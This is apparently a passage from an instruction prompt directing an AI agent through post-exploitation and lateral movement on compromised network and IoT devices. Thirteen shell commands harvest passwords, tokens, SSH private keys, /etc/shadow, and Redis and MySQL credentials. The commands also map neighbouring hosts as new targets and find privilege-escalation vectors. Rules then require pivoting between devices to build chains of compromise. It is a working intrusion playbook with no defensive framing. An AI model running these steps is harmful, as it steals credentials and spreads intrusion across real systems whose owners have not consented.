## Phase C — Post-exploitation (run on EVERY newly compromised device)

Run ALL commands below via ssh_exec. Each call is one command — do NOT batch into one call.

```bash
# 1. Identity
id && whoami && hostname && cat /etc/passwd | grep -v nologin | grep -v false

# 2. Credential harvest — files
grep -rn 'pass\|pwd\|password\|secret\|key\|token\|auth' /etc /home /opt /var/www /root 2>/dev/null | grep -v Binary | grep -v '.pyc' | grep -v '.png\|.jpg\|.ico' | head -50

# 3. Environment
env | grep -iE 'pass|pwd|key|secret|token|auth|api|db|mqtt|redis|mongo'

# 4. Config files — most valuable
find / -maxdepth 6 -name '.env' -o -name 'config.json' -o -name 'settings.py' -o -name '*.conf' -o -name 'mosquitto.conf' 2>/dev/null | grep -v '/proc\|/sys\|/dev' | head -15 | xargs cat 2>/dev/null | head -80

# 5. MQTT broker
cat /etc/mosquitto/passwd 2>/dev/null; cat /etc/mosquitto/mosquitto.conf 2>/dev/null

# 6. SSH keys — unlock other devices
find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | head -5 | xargs cat 2>/dev/null

# 7. Network reachability — discover new targets
ip route; ip neigh; cat /etc/hosts; arp -n 2>/dev/null

# 8. Running services — find more attack surface
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

# 9. Shadow file — crack offline
cat /etc/shadow 2>/dev/null | head -20

# 10. Privilege escalation vectors
find / -perm -4000 -type f 2>/dev/null | grep -v '/proc\|/sys' | head -20
find /etc/cron.d /etc/cron.daily /etc/cron.weekly -writable 2>/dev/null

# 11. Node-RED flows — may contain credentials
find / -name 'flows*.json' 2>/dev/null | head -3 | xargs cat 2>/dev/null | grep -i 'pass\|key\|secret\|token' | head -20

# 12. Redis dump — if redis is running locally
redis-cli -p 6379 KEYS '*' 2>/dev/null | head -20
redis-cli -p 6379 --no-auth-warning KEYS '*' 2>/dev/null | xargs -I{} redis-cli GET {} 2>/dev/null | head -40

# 13. MySQL local dump — if mysql is running
mysql -uroot --connect-timeout=3 -e 'SELECT user,password,authentication_string FROM mysql.user;' 2>/dev/null
```

Extract EVERY credential found → add to `credential_pool` immediately.
Note every new IP from routing/arp/hosts → add to `target_queue`.
If SUID binaries (other than /bin/su, /usr/bin/passwd, /usr/bin/sudo) found → document as privilege_escalation.

## Chain building rules — CRITICAL

**ALWAYS set `pivot_to`**: When you access device B FROM device A, device A's hop entry MUST have `pivot_to` = B's IP.
A hop with `pivot_to: null` means dead end — only the last hop in a chain should be null.

**Minimum chain depth**: Every chain should have ≥ 2 hops. If you only compromised the entry point, keep trying.

**One device → many children**: From a single compromised device, you can pivot to MULTIPLE devices.
Build a tree of compromises, not just a linear chain. Example:
  chain_1: entry → router → db_server
  chain_2: entry → router → mqtt_broker
  chain_3: entry → nodered → web_server

**Track access_via**: Each compromised_device must record:
  - `access_via`: "entry_point" OR the IP you pivoted from
  - `access_method`: "try_credential:ssh:admin:admin" OR "ssh_exec:pivot" etc.
